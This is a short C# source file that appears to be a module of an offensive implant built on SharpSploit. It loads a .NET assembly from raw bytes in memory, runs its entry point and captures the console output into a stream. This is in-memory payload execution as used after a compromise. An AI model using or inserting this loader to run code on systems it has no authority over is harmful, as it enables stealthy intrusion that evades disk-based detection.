using System;
using System.IO;

using Reflect = System.Reflection;

namespace Drone.SharpSploit.Execution
{
    public static class Assembly
    {
        public static void AssemblyExecute(Stream stream, byte[] bytes, string[] args = null)
        {
            args ??= new string[] { };

            var realStdOut = Console.Out;
            var realStdErr = Console.Error;
            
            var stdOutWriter = new StreamWriter(stream);
            var stdErrWriter = new StreamWriter(stream);
            stdOutWriter.AutoFlush = true;
            stdErrWriter.AutoFlush = true;
            
            Console.SetOut(stdOutWriter);
            Console.SetError(stdErrWriter);

            var asm = Reflect.Assembly.Load(bytes);
            
            // this blocks and will throw an exception when stream is closed
            try { asm.EntryPoint.Invoke(null, new object[] { args }); }
            catch (IOException) { /* pokemon */ }

            // clear up
            Console.Out.Flush();
            Console.Error.Flush();
            Console.SetOut(realStdOut);
            Console.SetError(realStdErr);
        }
    }
}